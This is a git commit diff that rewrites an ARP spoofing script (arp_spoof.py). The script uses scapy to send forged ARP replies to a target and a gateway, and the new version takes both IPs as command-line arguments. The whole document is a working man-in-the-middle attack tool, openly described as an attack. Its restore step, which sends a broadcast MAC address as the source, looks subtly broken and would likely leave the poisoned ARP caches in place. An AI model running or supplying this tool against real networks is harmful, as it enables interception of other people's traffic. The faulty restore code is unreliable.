7c2c6eb38f649e66d35a79996600cf2893e78628
Srijita Mondal <quokkaiscute1409@gmail.com>
2026-02-28 04:15:39 +0530

    Update arp_spoof.py

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -1,30 +1,33 @@
 from scapy.all import ARP, send
 import time
-from utils import get_mac
+import argparse
 
-target_ip = "192.168.1.10"
-gateway_ip = "192.168.1.1"
-
-target_mac = get_mac(target_ip)
-gateway_mac = get_mac(gateway_ip)
-
-def spoof(target_ip, target_mac, spoof_ip):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+def spoof(target_ip, spoof_ip):
+    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
     send(packet, verbose=False)
 
-def restore(dest_ip, dest_mac, source_ip, source_mac):
-    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
-                 psrc=source_ip, hwsrc=source_mac)
+def restore(target_ip, gateway_ip):
+    packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
     send(packet, count=4, verbose=False)
 
-try:
-    print("Starting ARP spoofing...")
-    while True:
-        spoof(target_ip, target_mac, gateway_ip)
-        spoof(gateway_ip, gateway_mac, target_ip)
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("Restoring network...")
-    restore(target_ip, target_mac, gateway_ip, gateway_mac)
-    restore(gateway_ip, gateway_mac, target_ip, target_mac)
-    print("Stopped.")
+def main():
+    parser = argparse.ArgumentParser(description="ARP Spoofing Attack")
+    parser.add_argument("-t", "--target", required=True, help="Target IP")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
+    args = parser.parse_args()
+
+    print(f"[+] ARP spoofing started: {args.target} <-> {args.gateway}")
+
+    try:
+        while True:
+            spoof(args.target, args.gateway)
+            spoof(args.gateway, args.target)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[!] Restoring network...")
+        restore(args.target, args.gateway)
+        restore(args.gateway, args.target)
+        print("[+] Restored")
+
+if __name__ == "__main__":
+    main()
